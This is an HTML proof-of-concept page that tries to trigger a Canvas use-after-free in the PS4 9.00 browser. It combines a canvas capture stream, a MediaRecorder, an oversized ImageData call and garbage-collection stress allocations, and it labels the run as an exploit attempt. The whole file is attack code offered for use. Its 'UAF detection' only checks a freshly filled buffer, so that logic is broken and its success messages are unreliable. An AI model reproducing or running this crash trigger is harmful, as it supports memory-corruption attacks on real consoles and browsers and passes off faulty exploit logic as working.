<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Canvas UAF PoC </title>
    <style>
        #trigger {
            margin: 20px 0;
            padding: 12px;
            font-size: 18px;
            cursor: pointer;
        }
        #status {
            margin-top: 10px;
            font-weight: bold;
            color: darkred;
        }
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Canvas UAF PoC (PS4 9.00)</h1>
    <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
    <button id="trigger">Trigger PoC</button>
    <div id="status">Idle...</div>
    <canvas id="canvas" width="512" height="512"></canvas>
    <script>
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('status');
        let attemptCount = 0;

        function stressGC() {
            for (let i = 0; i < 300; i++) {
                new ArrayBuffer(1024 * 1024);
            }
        }

        function drawOnCanvas() {
            ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.beginPath();
            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 50, 0, 2 * Math.PI);
            ctx.fill();
        }

        function triggerExploit() {
            attemptCount++;
            status.textContent = `Attempt ${attemptCount} in progress...`;

            try {
                // Start canvas capture stream
                const stream = canvas.captureStream(30);
                const options = {};
                const recorder = new MediaRecorder(stream, options);

                // Intensive drawing
                const drawInterval = setInterval(drawOnCanvas, 10);

                // Access properties to mimic test
                const videoBits = recorder.videoBitsPerSecond || 1000000;
                const textarea = document.createElement('textarea');
                const cols = textarea.cols || 20;

                // Stress ImageData
                new ImageData(videoBits, cols, {});

                // Check for UAF
                setTimeout(() => {
                    const testBuf = new Uint8Array(4096);
                    testBuf.fill(0x46);
                    if (testBuf[0] !== 0x46) {
                        status.textContent = 'Early UAF detected!';
                        clearInterval(drawInterval);
                        recorder.stop();
                        return;
                    }
                    stressGC();
                    status.textContent = 'Exploit attempted!';
                    clearInterval(drawInterval);
                    recorder.stop();
                }, 150);
            } catch (err) {
                console.error(`Error: ${err.message}`);
                status.textContent = 'Failed: Error occurred.';
            }
        }

        document.getElementById('trigger').addEventListener('click', () => {
            try {
                triggerExploit();
            } catch (err) {
                console.error(`Error: ${err.message}`);
                status.textContent = 'Failed: Error occurred.';
            }
        });
    </script>
</body>
</html>
